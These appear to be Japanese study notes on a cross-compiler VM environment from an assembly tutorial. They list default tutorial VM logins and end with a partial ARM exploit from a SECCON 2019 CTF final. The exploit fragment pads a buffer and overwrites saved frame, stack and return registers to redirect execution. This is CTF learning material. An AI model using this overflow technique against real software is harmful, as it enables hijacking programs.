# cross-gcc

## 開発環境
熱血！／大熱血！ アセンブラ入門  
開発環境のＶＭイメージ
http://kozos.jp/vmimage/burning-asm.html

### ID/PASS
user/progtooluser
root/progtoolroot


### tool
/usr/local/cross-gcc494/bin 配下にobjdumpなどのツールが入っている
例えば arm-elf用の toolは `ls /usr/local/cross-gcc494/bin/arm-elf*` 

objdump なら
```
/usr/local/cross-gcc494/bin/arm-elf-objdump -d arm-elf.x | less
```


## ARMのexploit例
問題・解答例は以下に保管。 https://github.com/yyamada12/ctfs/tree/master/seccon2019final 

ctfs/seccon2019final/solve/read-password/arm-elf.S

```
.org  0x1c10 - 16 - 256 - 4 - 28
```
org: バイナリをここに配置してくださいという命令

```
_start:

.long 0x61626364
.long 0
.long 0
.long 0
```
16バイトはまず適当に埋める

```
.long 0 /* FP -> FP */
.long 0x1c00 /* IP -> SP */
.long _code /* LR -> PC */
.long 0 /* PC -> discard */
```
戻りアドレスを設定する (`_code`)


<!--stackedit_data:
eyJoaXN0b3J5IjpbMjYwMTEyNjIzLDYzMTIxNTU4OSwtOTQ3ND
I5M119
-->